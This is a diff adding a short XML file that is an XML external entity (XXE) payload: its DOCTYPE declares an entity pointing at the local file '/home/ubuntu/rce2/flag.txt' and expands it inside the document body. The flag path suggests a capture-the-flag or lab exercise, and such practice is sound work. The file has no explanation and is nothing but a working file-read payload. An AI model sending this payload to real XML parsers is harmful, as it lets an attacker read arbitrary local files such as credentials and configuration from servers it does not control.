@@ -1,0 +1,9 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE doc [
+<!ENTITY otherFile SYSTEM "/home/ubuntu/rce2/flag.txt">
+]>
+<doc>
+  <foo>
+    <bar>&otherFile;</bar>
+  </foo>
+</doc>
